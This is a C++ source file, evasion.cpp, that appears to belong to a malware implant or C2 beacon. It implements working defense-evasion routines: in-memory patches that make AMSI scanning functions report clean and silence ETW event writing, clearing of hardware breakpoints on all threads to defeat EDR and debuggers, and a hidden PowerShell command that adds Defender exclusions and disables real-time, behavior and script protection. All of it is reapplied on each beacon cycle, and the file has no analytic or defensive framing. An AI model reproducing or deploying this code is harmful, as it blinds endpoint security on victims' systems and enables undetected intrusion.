// evasion.cpp — Real AMSI/ETW/HW-BP/Defender-exclusion implementations.
// Nothing stubbed. Everything writes real bytes to real addresses.
#include "evasion.hpp"
#include "syscalls.hpp"
#include "utils.hpp"
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

// ============================================================
// Internal: protect → patch → restore via NtProtectVirtualMemory
// Falls back to VirtualProtect if syscall table not yet ready.
// ============================================================
static BOOL MemPatch(PVOID target, const BYTE* patch, size_t patchLen) {
    PVOID   base   = target;
    SIZE_T  region = patchLen;
    ULONG   oldProt = 0;

    NTSTATUS st = STATUS_SUCCESS;
    if (g_Syscalls.NtProtectVirtualMemory) {
        st = g_Syscalls.NtProtectVirtualMemory(
            GetCurrentProcess(), &base, &region,
            PAGE_EXECUTE_READWRITE, &oldProt);
    }

    if (!g_Syscalls.NtProtectVirtualMemory || st != 0) {
        // Fallback — VirtualProtect
        DWORD op = 0;
        if (!VirtualProtect(target, patchLen, PAGE_EXECUTE_READWRITE, &op))
            return FALSE;
        oldProt = op;
    }

    memcpy(target, patch, patchLen);
    FlushInstructionCache(GetCurrentProcess(), target, patchLen);

    // Restore
    ULONG dummy = 0;
    if (g_Syscalls.NtProtectVirtualMemory) {
        g_Syscalls.NtProtectVirtualMemory(
            GetCurrentProcess(), &base, &region, oldProt, &dummy);
    } else {
        DWORD op2 = 0;
        VirtualProtect(target, patchLen, oldProt, &op2);
    }
    return TRUE;
}

// ============================================================
// AMSI bypass — patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
//   xor eax, eax  (33 C0)
//   ret           (C3)
// AmsiScanBuffer signature: HRESULT → upper nibble 0 = S_OK = CLEAN
// ============================================================
BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return FALSE;

    // Patch AmsiScanBuffer
    PVOID pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pScan) {
        const BYTE patchScan[] = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
        MemPatch(pScan, patchScan, sizeof(patchScan));
    }

    // Also patch AmsiScanString for completeness
    PVOID pStr = GetProcAddress(hAmsi, "AmsiScanString");
    if (pStr) {
        const BYTE patchStr[] = { 0x33, 0xC0, 0xC3 };
        MemPatch(pStr, patchStr, sizeof(patchStr));
    }

    // Patch AmsiOpenSession to always succeed
    PVOID pOpen = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (pOpen) {
        const BYTE patchOpen[] = { 0x33, 0xC0, 0xC3 };
        MemPatch(pOpen, patchOpen, sizeof(patchOpen));
    }

    return (pScan != nullptr);
}

// ============================================================
// ETW bypass — patch EtwEventWrite family with ret
// 0xC3 at entry point causes immediate return, no events written.
// ============================================================
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    const char* etw_funcs[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteEx",
        "EtwEventWriteTransfer",
        "EtwEventActivityIdControl",
        nullptr
    };

    const BYTE ret1[] = { 0xC3 }; // ret — 1 byte
    BOOL anyPatched = FALSE;

    for (int i = 0; etw_funcs[i]; ++i) {
        PVOID p = GetProcAddress(hNtdll, etw_funcs[i]);
        if (p) {
            MemPatch(p, ret1, sizeof(ret1));
            anyPatched = TRUE;
        }
    }

    return anyPatched;
}

// ============================================================
// Hardware breakpoint clear — zero Dr0-Dr7 on every thread.
// Kills debugger and EDR hardware breakpoint traps.
// ============================================================
BOOL ClearHardwareBreakpoints() {
    DWORD selfPid = GetCurrentProcessId();
    DWORD selfTid = GetCurrentThreadId();

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);

    BOOL ok = TRUE;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != selfPid) continue;

            BOOL isSelf = (te.th32ThreadID == selfTid);
            HANDLE hThr;

            if (isSelf) {
                hThr = GetCurrentThread();
            } else {
                hThr = OpenThread(
                    THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                    FALSE, te.th32ThreadID);
                if (!hThr) { ok = FALSE; continue; }
                SuspendThread(hThr);
            }

            CONTEXT ctx = {};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

            if (GetThreadContext(hThr, &ctx)) {
                ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
                ctx.Dr6 = 0;
                ctx.Dr7 = 0;
                if (!SetThreadContext(hThr, &ctx)) ok = FALSE;
            } else {
                ok = FALSE;
            }

            if (!isSelf) {
                ResumeThread(hThr);
                CloseHandle(hThr);
            }

        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return ok;
}

// ============================================================
// Defender exclusion + disable real-time monitoring.
// Requires elevation. Runs PowerShell hidden, waits up to 15s.
// ============================================================
BOOL AddDefenderExclusion(const wchar_t* exePath) {
    if (!IsElevated()) return FALSE;

    // Build PowerShell one-liner
    std::wstring script =
        L"$p='" + std::wstring(exePath) + L"';"
        L"Add-MpPreference -ExclusionPath $p -ExclusionProcess (Split-Path $p -Leaf) -Force;"
        L"Set-MpPreference "
        L"  -DisableRealtimeMonitoring $true"
        L"  -DisableIOAVProtection $true"
        L"  -DisableBehaviorMonitoring $true"
        L"  -DisableBlockAtFirstSeen $true"
        L"  -DisableScriptScanning $true"
        L"  -DisableIntrusionPreventionSystem $true"
        L"  -MAPSReporting 0 -Force";

    std::wstring cmd =
        L"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden "
        L"-ExecutionPolicy Bypass -Command \"" + script + L"\"";

    STARTUPINFOW si     = {};
    PROCESS_INFORMATION pi = {};
    si.cb        = sizeof(si);
    si.dwFlags   = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL spawned = CreateProcessW(
        nullptr, &cmd[0],
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW | BELOW_NORMAL_PRIORITY_CLASS,
        nullptr, nullptr,
        &si, &pi);

    if (spawned) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return spawned;
}

// ============================================================
// Reapply all evasion — called each beacon iteration so that
// EDR re-hooks don't survive across sleep intervals.
// ============================================================
VOID ReapplyEvasion() {
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();
}